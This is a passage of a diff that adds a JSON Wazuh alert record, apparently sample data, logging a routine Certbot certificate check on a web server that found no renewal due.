+    "timestamp": "2026-09-30T05:00:15.820+0000",
+    "rule": {
+      "id": "1002",
+      "level": 2,
+      "description": "System: Let's Encrypt / Certbot certificate check executed normally",
+      "groups": [
+        "syslog",
+        "maintenance",
+        "ssl"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "certbot"
+    },
+    "full_log": "Sep 30 05:00:15 web-cluster-01 certbot[1029]: Certificate not yet due for renewal; no action taken.",
+    "data": {
+      "domain": "corp.example.test",
+      "status": "UP_TO_DATE"
+    },
+    "location": "/var/log/letsencrypt/letsencrypt.log"
+  }
+]
